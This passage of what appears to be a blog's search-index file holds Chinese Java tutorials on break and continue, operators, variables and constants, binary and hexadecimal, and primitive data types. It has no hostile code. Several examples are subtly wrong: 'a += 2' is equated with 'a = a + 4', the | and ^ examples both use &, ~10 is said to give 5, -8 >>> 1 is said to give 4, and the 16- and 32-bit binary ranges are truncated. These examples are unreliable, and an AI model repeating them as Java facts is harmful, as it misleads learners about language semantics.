class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span> label<span class="token punctuation">;</span><span class="token comment">//结束块</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token comment">//如果执行了 break label 语句将直接跳到这里</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意：break 标签只能跳出语句块，不能跳入语句块。</strong><br><strong>并不提倡这种方式…</strong></p></blockquote><br>### continue 语句**continue 语句用于将控制转移到最内层循环的首部（也就是跳出当前循环，继续下一次循环，而不是结束循环）：**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>sum <span class="token operator">&lt;</span> goal<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"输入一个数字："</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    sum <span class="token operator">+=</span> n<span class="token punctuation">;</span><span class="token comment">//如果 n 小于 0 就不会执行这一步</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果 n &lt; 0 则 continue 语句约过了当前循环体的剩余部分，直接开始下一次循环。</p></blockquote><blockquote><p>如果将 continue 语句用于 for 循环中，就会跳到 for 循环的“更新计数器”部分：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> count <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> count<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"输入一个数字，-1 则退出："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    n <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    sum <span class="token operator">+=</span> n<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该代码如果 n 小于 0，则 continue 语句直接跳转到 count++ 语句。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流程控制 </tag>
            
            <tag> 块作用域 </tag>
            
            <tag> if/else </tag>
            
            <tag> for </tag>
            
            <tag> for each </tag>
            
            <tag> switch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运算符</title>
      <link href="/2017/02/23/yun-suan-fu/"/>
      <url>/2017/02/23/yun-suan-fu/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">类别</th><th align="center">Java 运算符</th></tr></thead><tbody><tr><td align="center">算数运算符</td><td align="center">+ - * / % ++ –</td></tr><tr><td align="center">扩展赋值运算符</td><td align="center">+= -= *= /= %=</td></tr><tr><td align="center">比较运算符</td><td align="center">&gt; &lt; &gt;= &lt;= == !=</td></tr><tr><td align="center">逻辑运算符</td><td align="center">&amp;&amp;、丨丨、！</td></tr><tr><td align="center">位运算符</td><td align="center">&amp; 丨 ^ ~ &gt;&gt; &lt;&lt; &gt;&gt;&gt;</td></tr><tr><td align="center">赋值运算符</td><td align="center">=</td></tr></tbody></table><span id="more"></span><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><p>在 Java 中，使用算数运算符 + 、- 、* 、/ 表示加、减、乘、除运算。当参与 / 运算的两个操作数都是整数时，表示整数除法；否则，表示浮点除法。整数的求余操作（有时称为取模）用 % 表示。</p><blockquote><p>整数被 0 除将会产生一个异常，而浮点数被 0 除将会得到无穷大或 NaN 结果。</p></blockquote><p>可以在赋值语句中采用一种简化的格式书写二元算术运算符：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">a <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>b <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>c <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>d <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">;</span>e <span class="token operator">%=</span> <span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该写法等同于：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>b <span class="token operator">=</span> b <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>c <span class="token operator">=</span> c <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>d <span class="token operator">=</span> d <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>e <span class="token operator">=</span> e <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### 自增运算符与自减运算符加 1 、减 1 是数值变量最常见的操作，所以 Java 使用了两种自增、两种自减运算符：**++n 和 n++ 将变量 n 的当前值加 1；****--n 和 n-- 将变量 n 的当前值减 1；**<p><strong>前缀与后缀区别：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token operator">++</span>m<span class="token punctuation">;</span><span class="token comment">//现在 a 是 16 ，m 是 8</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//现在 b 是 14 ，n 是 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>因为这些运算符改变了变量的值，所以它的操作数不能使数值，例如，2++ 就是一条非法的语句。</li><li>建议不要在其他表达式的内部使用 ++ 或 –，这样编写的代码很容易令人困惑，并会产生烦人的 bug 。</li></ul><br>## 关系运算符与 boolean 运算符**关系运算符：**&gt;`==` 检测左右两边是否相等`!=` 检测左右两边是否不相等`&lt;` 检测左边是否小于右边`&gt;` 检测左边是否大于右边`&lt;=` 检测左边是否小于或等于右边`&gt;=` 检测左边是否大于或等于右边<p><strong>boolean 运算符：</strong></p><blockquote><p>&amp;&amp; 逻辑“与”<br>|| 逻辑“或”<br>! 逻辑“非”</p></blockquote><p><strong>&amp;&amp; 和 || 是按照“短路”方式求值的。如果第一个操作数已经能够确定表达式的值，则第二个操作数就不必计算了：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token number">1</span> <span class="token operator">/</span> x <span class="token operator">&gt;</span> x <span class="token operator">+</span> y<span class="token punctuation">)</span> <span class="token comment">//当 x 为 0 时，不会计算第二部分。因此也不会出现除以 0 的错误。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## 位运算符**位运算符可以直接对组成整型数值的各个位进行操作。**位运算符包括：&amp;, |, ^, ~, &gt;&gt;, &lt;&lt; 和 &gt;&gt;&gt;。### &amp; 运算符按位“与”运算：二进制位都为 1 则为 1 ，例：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0b1010</span> <span class="token operator">&amp;</span> <span class="token number">0b1100</span><span class="token punctuation">;</span><span class="token comment">//结果为 0b1000 ,也就是 a = 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="运算符"><a href="#运算符" class="headerlink" title="| 运算符"></a>| 运算符</h3><p>按位“或”运算：二进制位有一个为 1 则为 1 ，例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0b1010</span> <span class="token operator">&amp;</span> <span class="token number">0b1100</span><span class="token punctuation">;</span><span class="token comment">//结果为 0b1110 ，也就是 a = 14</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="运算符-1"><a href="#运算符-1" class="headerlink" title="^ 运算符"></a>^ 运算符</h3><p>按位“异或”运算：二进制位不同为 1 ，相同为 0 ，例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0b1010</span> <span class="token operator">&amp;</span> <span class="token number">0b1100</span><span class="token punctuation">;</span><span class="token comment">//结果为 0b0110 ,也就是 a = 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="运算符-2"><a href="#运算符-2" class="headerlink" title="~ 运算符"></a>~ 运算符</h3><p>按位“非”运算：二进制位取反，1 变 0 ，0 变 1 ，例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token operator">~</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token comment">//10 的二进制是 0b1010, 结果为 0b0101 ，也就是 a = 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="gt-gt-运算符"><a href="#gt-gt-运算符" class="headerlink" title=">> 运算符"></a>&gt;&gt; 运算符</h3><p>“右移”运算：将二进制位进行右移运算，用符号位填充高位：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//0b0010</span><span class="token keyword">int</span> b <span class="token operator">=</span> a <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//将 a 右移 1 位，b = 0b0001 ，也就是 b = 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="lt-lt-运算符"><a href="#lt-lt-运算符" class="headerlink" title="<< 运算符"></a>&lt;&lt; 运算符</h3><p>“左移”将二进制位进行左移运算，用 0 填充低位：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//0b0010</span><span class="token keyword">int</span> b <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//将 a 左移 2 位，b = 0b1000 ，也就是 b = 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="gt-gt-gt-运算符"><a href="#gt-gt-gt-运算符" class="headerlink" title=">>> 运算符"></a>&gt;&gt;&gt; 运算符</h3><p>无符号“右移” 将二进制位进行右移运算，用 0 填充高位：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//0b1000</span><span class="token keyword">int</span> b <span class="token operator">=</span> a <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//将 a 无符号右移 1 位，b = 0b0100 ，也就是 b = 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>这些运算符在位模式下工作，意味着可以使用屏蔽技术获得整数中的各个位，例如：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token comment">//假设 n 是一个整型变量</span><span class="token keyword">int</span> fourthBitFromRight <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0b1000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0b1000</span><span class="token punctuation">;</span><span class="token comment">//如果用二进制表示的 n 从右数第四位为 1 ，则返回 1 ，否则返回 0 。</span><span class="token comment">//也可以用移位运算实现：</span>fourthBitFromRight <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>按位运算都是补码运算的：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">;</span><span class="token comment">//0001 0011</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token operator">~</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//按位取反为 11101100，此时仍为补码，换算原码为 10010100，也就是-20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>## 附：运算符优先级<p><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fd512d1nlij21kw0sptiu.jpg" alt="运算符优先级"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运算符 </tag>
            
            <tag> 运算符优先级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量与常量</title>
      <link href="/2017/02/23/bian-liang-yu-chang-liang/"/>
      <url>/2017/02/23/bian-liang-yu-chang-liang/</url>
      
        <content type="html"><![CDATA[<p>在数学中，变量就是数值可变的量，常量就是数值不可变的量，例如一条直线表达式 <code>y = 2x</code> 中 x 、y 就是变量，y 的值会随着 x 值的变化而变化，而 2 就是常量，无论 x 和 y 如何变化，2 都是 2，不会改变。Java 也类似。</p><span id="more"></span><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p><strong>在 Java 中，每一个变量属于一个类型。在声明变量时，变量所属的类型位于变量名之前。</strong></p><p>例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> salary<span class="token punctuation">;</span><span class="token comment">//声明一个双精度浮点类型的变量，变量名位 salary</span><span class="token keyword">int</span> vacationDays<span class="token punctuation">;</span><span class="token comment">//声明一个 整型 变量：vacationDays</span><span class="token keyword">long</span> earthPopulation<span class="token punctuation">;</span><span class="token comment">//声明一个 长整型 变量：earthPopulation</span><span class="token keyword">boolean</span> done<span class="token punctuation">;</span><span class="token comment">//声明两个 布尔 类型的变量：done</span><span class="token keyword">int</span> hireday<span class="token punctuation">,</span> hireDay<span class="token punctuation">;</span><span class="token comment">//声明两个 整型 变量：hireday 和 hireDay</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>由于声明是一条完整的语句，所以必须以分号结束。<br>变量名必须是一个以字母开头的（<em>包括 “$” 和 “_“，但是不推荐</em>）、由字母和数字构成的序列。<br>不能将变量名命名为 Java 保留字。<br>可以在一行中声明多个变量，<code>但是为了提高程序的可读性，不提倡使用这种风格。</code><br><code>变量名区分大小写</code>，例如上面代码中的 hireday 和 hireDay 是两个不同的变量名</p></blockquote><br>### 变量初始化<p><strong>声明一个变量后，必须用赋值语句对变量进行显式初始化，千万不要使用未被初始化的变量：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> vacationDays<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>vacationDays<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里会报错，因为变量 vacationDays 没有初始化</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对一个已经声明的变量进行赋值，需要将变量名放在等号 “=” 左侧，相应取值的 Java 表达式放在等号的右侧。也可以将变量的声明与初始化放在同一行中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> vacationDays<span class="token punctuation">;</span><span class="token comment">//声明变量</span>vacationDays <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token comment">//用赋值语句对变量进行初始化</span><span class="token keyword">int</span> day <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token comment">//声明变量的同时初始化</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>Java 中可以将变量声明放在代码中的任何地方，但是尽量将变量的声明尽可能地靠近变量第一次使用的地方。<br>“=” 也算是一种<a href="/2017/02/23/%E8%BF%90%E7%AE%97%E7%AC%A6/">运算符</a>，可以在一行写多个赋值表达式，但<strong>它的<a href="/2017/02/23/%E8%BF%90%E7%AE%97%E7%AC%A6/">结合性</a>是从右往左</strong>。例如：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">//此时先计算 i 等于 5，然后计算 j = i</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>## 常量<p><strong>在 Java 中，使用关键字 final 修饰的变量表示常量，关键字 final 表示这个变量只能被赋值一次。一旦被赋值之后，就不能够再修改了。<code>习惯上将常量名使用全大写</code>。</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">CM_PER_INCH</span> <span class="token operator">=</span> <span class="token number">2.54</span><span class="token punctuation">;</span><span class="token comment">//声明一个 double 类型的常量</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>在 Java 中，经常希望某个常量可以在一个类中的多个方法中使用，通常将这些常量称为<code>类常量</code>。可以使用关键字 static final 设置一个类常量：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> demo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">CM_PER_INCH</span> <span class="token operator">=</span> <span class="token number">2.54</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">double</span> paperWidth <span class="token operator">=</span> <span class="token number">8.5</span><span class="token punctuation">;</span>        <span class="token keyword">double</span> paperHeight <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Paper size in centimeters: "</span> <span class="token operator">+</span> paperWidth <span class="token operator">*</span> <span class="token constant">CM_PER_INCH</span> <span class="token operator">+</span> <span class="token string">" by "</span> <span class="token operator">+</span> paperHeight <span class="token operator">*</span> <span class="token constant">CM_PER_INCH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>需要注意的是，<strong>类常量的定义位于类的内部，方法与构造器的外部</strong>。因此，在同一个类的其他方法中也可以使用这个常量。<br>而且，如果一个常量被声明为 public，那么其他类的方法也可以使用这个常量。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 变量 </tag>
            
            <tag> 常量 </tag>
            
            <tag> final </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用进制</title>
      <link href="/2017/02/20/chang-yong-jin-zhi/"/>
      <url>/2017/02/20/chang-yong-jin-zhi/</url>
      
        <content type="html"><![CDATA[<p>我们平时使用的数字大多是十进制，也就是满 10 进 1。除此之外还有满 2 进 1 的二进制和满 16 进 1 的十六进制等等。</p><span id="more"></span><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><h3 id="在-Java-中加上前缀“0b”就可以写二进制数，如-0b1000-就是-8。"><a href="#在-Java-中加上前缀“0b”就可以写二进制数，如-0b1000-就是-8。" class="headerlink" title="在 Java 中加上前缀“0b”就可以写二进制数，如 0b1000 就是 8。"></a>在 Java 中加上前缀“0b”就可以写二进制数，如 0b1000 就是 8。</h3><p>权：2^n<br><strong>补码</strong><br>最高位为符号位：<strong>正数为 0，负数为 1</strong><br><strong>正数的补码</strong>：与原码相同<br><strong>负数的补码</strong>：符号位为 1，其余位为该数绝对值的原码按位取反，然后整个数加 1。<br>假设计算机中使用 4 位的二进制表示数据</p><h3 id="四位补码示例"><a href="#四位补码示例" class="headerlink" title="四位补码示例"></a>四位补码示例</h3><table><thead><tr><th align="center">十进制</th><th align="center">绝对值的原码</th><th align="center">反码</th><th align="center">补码</th></tr></thead><tbody><tr><td align="center">7</td><td align="center">0111</td><td align="center">1000</td><td align="center">0111</td></tr><tr><td align="center">6</td><td align="center">0110</td><td align="center">1001</td><td align="center">0110</td></tr><tr><td align="center">5</td><td align="center">0101</td><td align="center">1010</td><td align="center">0101</td></tr><tr><td align="center">4</td><td align="center">0100</td><td align="center">1011</td><td align="center">0100</td></tr><tr><td align="center">3</td><td align="center">0011</td><td align="center">1100</td><td align="center">0011</td></tr><tr><td align="center">2</td><td align="center">0010</td><td align="center">1101</td><td align="center">0010</td></tr><tr><td align="center">1</td><td align="center">0001</td><td align="center">1110</td><td align="center">0001</td></tr><tr><td align="center">0</td><td align="center">0000</td><td align="center">1111</td><td align="center">0000</td></tr><tr><td align="center">-1</td><td align="center">0001</td><td align="center">1110</td><td align="center">1111</td></tr><tr><td align="center">-2</td><td align="center">0010</td><td align="center">1101</td><td align="center">1110</td></tr><tr><td align="center">-3</td><td align="center">0011</td><td align="center">1100</td><td align="center">1101</td></tr><tr><td align="center">-4</td><td align="center">0100</td><td align="center">1011</td><td align="center">1100</td></tr><tr><td align="center">-5</td><td align="center">0101</td><td align="center">1010</td><td align="center">1011</td></tr><tr><td align="center">-6</td><td align="center">0110</td><td align="center">1001</td><td align="center">1010</td></tr><tr><td align="center">-7</td><td align="center">0111</td><td align="center">1000</td><td align="center">1001</td></tr><tr><td align="center">-8</td><td align="center">1000</td><td align="center">0111</td><td align="center">1000</td></tr></tbody></table><h3 id="常用补码的范围："><a href="#常用补码的范围：" class="headerlink" title="常用补码的范围："></a>常用补码的范围：</h3><table><thead><tr><th align="right">位数</th><th align="left">二进制范围</th><th align="left">十进制范围</th></tr></thead><tbody><tr><td align="right">4 位补码的范围</td><td align="left">1000~0111</td><td align="left">-8~7</td></tr><tr><td align="right">8 位补码的范围</td><td align="left">1000 0000~0111 1111</td><td align="left">-128~127</td></tr><tr><td align="right">16 位补码的范围</td><td align="left">1000 0000 0000~0111 1111 1111</td><td align="left">-32768~32767</td></tr><tr><td align="right">32 位补码的范围</td><td align="left">1000 0000 0000 0000~0111 1111 1111 1111</td><td align="left">-2147483648~2147483647</td></tr></tbody></table><h2 id="16-进制"><a href="#16-进制" class="headerlink" title="16 进制"></a>16 进制</h2><p>逢十六进一，是二进制的简写形式。每一位表示二进制的 4 位。<br>十六进制数字前面需要加 0x<br>如 0xAC5F</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据类型与类型转换</title>
      <link href="/2017/02/20/shu-ju-lei-xing-yu-lei-xing-zhuan-huan/"/>
      <url>/2017/02/20/shu-ju-lei-xing-yu-lei-xing-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<p>Java 是一种强类型语言。这就意味着必须为每一个变量声明一种类型。在 Java 中一共有四种共 8 个基本数据类型。</p><span id="more"></span><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><table><thead><tr><th align="left">种类</th><th align="left">包含的基本数据类型</th></tr></thead><tbody><tr><td align="left">整型</td><td align="left">byte、short、int、long</td></tr><tr><td align="left">浮点型</td><td align="left">float、double</td></tr><tr><td align="left">字符型</td><td align="left">char</td></tr><tr><td align="left">布尔型</td><td align="left">boolean</td></tr></tbody></table><br>### Java 整型:<p><strong>整型用于表示没有小数部分的值，允许位负数。</strong></p><table><thead><tr><th align="left">类型</th><th align="left">外号</th><th align="left">存储需求</th><th align="left">取值范围</th></tr></thead><tbody><tr><td align="left">byte</td><td align="left">字节</td><td align="left">1 字节</td><td align="left">-128~127</td></tr><tr><td align="left">short</td><td align="left">短整型</td><td align="left">2 字节</td><td align="left">-32 768~32 767</td></tr><tr><td align="left">int</td><td align="left">整型</td><td align="left">4 字节</td><td align="left">-2 147 483 648~2 147 483 647(刚好超过 20 亿)</td></tr><tr><td align="left">long</td><td align="left">长整型</td><td align="left">8 字节</td><td align="left">-9 223 372 036 854 775 808~9 223 372 036 854 775 807</td></tr></tbody></table><p><strong>int 位整型的默认运算类型，长整型数值后需要有个 L 或 l 后缀</strong></p><blockquote><p>1T = 1024G<br>1G = 1024M<br>1M = 1024KB<br>1KB = 1024B<br>1B = 8bit</p></blockquote><p>示例</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> c <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token comment">//超范围复赋值会报错</span><span class="token comment">//等同于 byte d = 5;</span><span class="token keyword">byte</span> d <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">//int ---&gt;byte</span><span class="token keyword">byte</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">byte</span> n <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">byte</span> k <span class="token operator">=</span> m <span class="token operator">+</span> n<span class="token punctuation">;</span><span class="token comment">//int ---&gt; byte 这里会报错</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2147483647</span><span class="token punctuation">;</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> c <span class="token operator">=</span> m <span class="token operator">+</span> n<span class="token punctuation">;</span><span class="token comment">//此时 c = -2147483648 最大加一变最小</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>java 是一种先编译后运行的语言。<br>在编译期间，java 是不能直接知道变量的具体值的。<br>所以在这里，编译的时候不知道 m 和 n 的具体数值，也就不能确定 m + n 的结果是否会超出 byte 的范围。<br>在 Java 中，整型的默认运算类型是 int。所以比 int 小的数据类型，在参与运算的时候回自动转换为 int 类型。</p></blockquote><p><strong>总结：</strong><br><strong>1.在 Java 中，整型的字面量默认是 int 类型。</strong><br><strong>2.在 Java 中，整形的默认运算类型是 int 类型。</strong><br><strong>3.有比 int 小的类型，在运算的时候会自动转成 int 类型。</strong><br><strong>4.有比 int 大的类型，在运算的时候会转成最大的类型来运算。</strong></p><br>### Java 浮点型<p><strong>浮点型用于表示有小数部分的数值：</strong></p><table><thead><tr><th align="left">类型</th><th align="left">外号</th><th align="left">存储需求</th><th align="left">取值范围</th></tr></thead><tbody><tr><td align="left">float</td><td align="left">单精度浮点型</td><td align="left">4 字节</td><td align="left">±3.402 823 47E + 38F（有效位数 6~7 位）</td></tr><tr><td align="left">double</td><td align="left">双精度浮点型</td><td align="left">8 字节</td><td align="left">±1.797 693 134 862 315 70E + 308（有效位数 15 位）</td></tr></tbody></table><p><strong>float 类型的数值有一个后缀 F 或 f，没有后缀的浮点数值默认为 double 类型。也可以在浮点数后面添加后缀 D 表示 double 类型的数值。</strong></p><p>float 类型含 1 位符号位，8 位指数位和 23 位尾数位<br>double 类型含 1 位符号位，11 位指数位和 52 位尾数位</p><blockquote><p>总结：<br><strong>1. 在 Java 